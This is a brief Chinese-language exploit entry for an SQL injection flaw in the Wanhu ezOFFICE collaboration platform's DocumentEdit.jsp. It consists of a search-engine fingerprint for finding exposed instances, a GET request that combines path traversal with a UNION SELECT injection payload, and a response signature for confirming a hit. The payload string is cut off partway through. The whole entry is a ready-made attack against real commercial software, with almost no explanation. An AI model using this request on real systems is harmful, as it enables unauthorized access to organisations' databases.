# 万户ezOFFICEDocumentEdit.jspSQL注入漏洞

万户ezOFFICEDocumentEdit.jsp ｜ SQL注入 ｜ —
- **指纹**：`app="ezOFFICE协同管理平台"`
- **请求**：`GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'%20union%20select%20null,null,(SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27102`
- **响应特征**：200 6cfe798ba8e5